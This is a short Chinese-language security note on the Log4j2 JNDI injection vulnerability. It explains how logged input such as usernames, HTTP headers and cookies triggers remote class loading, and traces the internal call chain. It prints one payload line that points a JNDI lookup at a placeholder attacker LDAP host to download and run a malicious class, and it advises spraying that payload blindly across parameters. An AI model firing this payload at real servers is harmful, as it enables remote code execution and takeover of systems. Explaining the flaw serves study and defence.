---
title: Log4j各版本漏洞
date: 2026-01-13
updated: 2026-01-13
tags:
  - 服务组件框架漏洞
  - Java安全
categories:
  - 安全相关
description: Log4j各版本漏洞
published: true
---
> 历史漏洞 https://avd.aliyun.com/search?q=Log4j

Apache Log4j2，Java 最常用的日志组件，因为支持 JNDI 注入，导致只要打日志就能被远程代码执行。

把恶意代码写进用户名、密码、URL、UA、Cookie 等只要服务器用 Log4j2 打日志，则会执行

Log4j2 在记录日志时，会自动解析 `${}` 表达式。攻击者构造：

```
${jndi:ldap://攻击机IP/恶意类}
```

服务器日志一记录 → 自动触发：

- 解析 `${}`
-  发起 JNDI 请求
-  连接攻击机 LDAP/RMI 服务
-  下载并执行恶意类 → 服务器沦陷

漏洞触发点：用户名、邮箱、手机号、HTTP 头、接口参数、订单号等

与普通 JNDI（直接加载远程类） 注入不同，Log4j2 限制：只允许加载 Reference 类型。

所以必须构造 Reference，指定远程 ObjectFactory，在 `getObjectInstance()` 中执行代码

漏洞触发 `logger.error` `logger.info`

底层触发函数：

- `StrSubstitutor.substitute()`
- `resolveVariable()`
- `JndiLookup.lookup()` 最终触发

实战中未知开发者会对哪个参数进行日志处理，所以在不确定特征和参数的情况下只能盲打。
